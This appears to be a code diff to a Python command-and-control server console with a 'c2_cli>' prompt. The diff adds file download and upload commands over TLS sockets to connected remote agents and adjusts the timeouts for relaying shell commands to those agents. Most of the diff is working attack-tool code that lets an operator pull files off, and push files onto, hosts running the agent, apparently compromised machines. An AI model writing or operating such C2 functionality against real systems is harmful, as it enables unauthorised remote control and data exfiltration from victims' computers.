@@ -9,6 +9,7 @@ from threading import Lock
 from _thread import *
 import struct
 import ssl
+import tqdm
 
 
 def recreate_tasks_table(conn, cursor):
@@ -122,6 +123,8 @@ class CLI(cmd.Cmd):
         self.current_shell_conn = None        
         self.current_shell_idx = -1
         self.ssl_socket_context = None
+        self.file_separator = "<SEPARATOR>"
+        self.buffer_size = 1024 #* 4
 
     def emptyline(self):
         pass       
@@ -139,16 +142,89 @@ class CLI(cmd.Cmd):
                     if self.current_shell_conn:
 
                         if line.split()[0] == 'download':
-                            print("Great! download functionality")
+                            self.current_shell_conn.settimeout(3600.0)
+                            # Send the file name to the agent
+                            filename_cmd = f"c2-sessions download {line.split()[1]}"
+                            send_msg(self.current_shell_conn, filename_cmd.encode())                            
+
+                            # Receive the file size from the agent
+                            received = recv_msg(self.current_shell_conn).decode()                            
+                            filesize = int(received.split(self.file_separator)[0])                            
+
+                            # print(f"filesize: {filesize}")
+
+                            if filesize != -1:                                                                
+                                try:
+
+                                    with open(line.split()[1], 'wb') as f:
+                                        with tqdm.tqdm(total=filesize, unit='B', unit_scale=True) as pbar:
+                                            bytes_received = 0
+                                            while bytes_received < filesize:
+                                                chunk = self.current_shell_conn.recv(1024)
+                                                f.write(chunk)
+                                                bytes_received += len(chunk)
+                                                pbar.update(len(chunk))
+                                    print(f"[+] File {line.split()[1]} received successfully")
+                                except Exception as ex:
+                                    print(f'[-] Error on download: {ex}')                                    
+                                    raise
+                                
+                            else:
+                                print("[-] Error! File doesn't exist?..")
+
+                        elif line.split()[0] == 'upload':
+                            self.current_shell_conn.settimeout(3600.0)
+                            # Send the file name to the agent
+
+                            filename = ""
+
+                            try:
+                                filename = line.split()[1]
+                            except Exception as ex:
+                                print('No file provided')
+                                return
+
+                            if not os.path.exists(filename):
+                                print(f"File {filename} doesn't exist")                                
+                                return  
+                            
+                            file_size = os.path.getsize(filename)
+
+                            filename_cmd = f"c2-sessions upload {filename} {file_size}"
+                            
+                            try:                                
+                                with open(filename, 'rb') as f:
+                                    send_msg(self.current_shell_conn, filename_cmd.encode())
+                                    go_or_not = recv_msg(self.current_shell_conn).decode()
+                                    # print(f'go_or_not: {go_or_not}')
+                                    if go_or_not.split(self.file_separator)[0] != "GO!":
+                                        print(f"Result: {go_or_not}")
+                                        return
+                                    with tqdm.tqdm(total=file_size, unit='B', unit_scale=True) as pbar:                                        
+                                        bytes_sent = 0
+                                        while bytes_sent < file_size:
+                                            chunk = f.read(1024)
+                                            self.current_shell_conn.sendall(chunk)
+                                            bytes_sent += len(chunk)
+                                            pbar.update(len(chunk))
+                                    # print(f"[+] File {filename} uploaded successfully")
+                            except Exception as ex:
+                                print(f"[-] Error on upload : {ex}")                                
+                            
+                            response_res = recv_msg(self.current_shell_conn).decode()
+                            print(f"Result: {response_res}")
+                            
                         else:
                             send_msg(self.current_shell_conn,str.encode(f'c2-sessions cmd {line}'))                        
-                            self.current_shell_conn.settimeout(30.0)
+                            self.current_shell_conn.settimeout(60.0)
                             rsp = recv_msg(self.current_shell_conn)                        
                             print(rsp.decode('utf-8', errors='ignore'))
                     else:
                         print("Not valid connection")
                 except Exception as ex:
-                    print(f"timeout... response took too long.")
+                    print(f"timeout... response took too long. {ex}")
+                    import traceback
+                    traceback.print_exc()
                     self.prompt = 'c2_cli> '
                     # self.current_shell_conn
                     self.close_session(self.current_shell_idx)
@@ -255,9 +331,16 @@ class CLI(cmd.Cmd):
             try:                
                 client_socket, address = self.ServerSocket.accept()
 
-                conn = self.ssl_socket_context.wrap_socket(client_socket, server_side=True)               
-                
+                conn = self.ssl_socket_context.wrap_socket(client_socket, server_side=True)  
+
+                # maybe a non-blocking conn is an equal good option
+                           
+                # this resets the timer so set it before the timeout                
                 conn.setblocking(True)
+
+                # set a guard timer in case a pong isn't received
+                conn.settimeout(5.0)
+
                 client_rsp = recv_msg(conn).decode("utf-8")                                
                 address = address + (client_rsp,)
 
